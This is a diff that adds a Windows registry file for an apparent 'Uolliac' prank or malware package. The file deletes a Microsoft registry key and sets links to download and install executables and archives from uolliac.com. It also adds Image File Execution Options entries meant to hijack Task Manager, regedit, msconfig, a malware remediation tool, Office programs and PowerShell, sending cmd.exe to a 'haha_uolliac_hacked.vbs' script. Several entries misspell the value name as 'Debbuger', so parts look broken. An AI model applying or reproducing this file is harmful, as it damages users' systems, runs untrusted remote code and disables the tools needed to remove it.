@@ -1,0 +1,68 @@
+Windows Registry Editor Version 5.00
+
+[-HKEY_LOCAL_MACHINE\SYSTEM\Software\Microsoft]
+
+[HKEY_LOCAL_MACHINE\SYSTEM\Software\Uolliac]
+"Installed"=dword:00000000
+"InstallLink"="http://uolliac.com/software/uolliac_os.exe"
+
+[HKEY_LOCAL_MACHINE\SYSTEM\Software\Uolliac\Programs]
+"PreInstall"=dword:00000001
+"PostInstallWizDat"=qword:07afdaddfefd1afc
+"PostInstallWizInst"="uolliac.com/software/postinstall_onl.uol"
+"PostInstallApps"="uolliac.com/software/postinstall_apps.zip"
+"RunPostInstall"=dword:00000001
+
+[-HKEY_LOCAL_MACHINE\SYSTEM\Setup\BuildUpdate]
+
+[HKEY_LOCAL_MACHINE\SYSTEM\Setup\BuildUpdate]
+"OSPath"="uolliac_os.exe"
+"Install"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe]
+"Debbuger"="cmd.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe]
+"Debbuger"="cmd.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe]
+"Debbuger"="cmd.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\setup.exe]
+"Debbuger"="cmd.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe]
+"Debbuger"="cmd.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Windows.Malware.Effects.Remediation.Tool.exe]
+"Debbuger"="cmd.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe]
+"Debbuger"="cmd.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\python.exe]
+"Debbuger"="cmd.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winword.exe]
+"Debbuger"="cmd.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powerpnt.exe]
+"Debbuger"="cmd.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\excel.exe]
+"Debbuger"="cmd.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\outlook.exe]
+"Debbuger"="cmd.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe]
+"Debbuger"="cmd.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\reg.exe]
+"Debbuger"="cmd.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe]
+"Debbuger"="wscript.exe C:\windows\haha_uolliac_hacked.vbs"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe]
+"Debbuger"="wininit.exe"
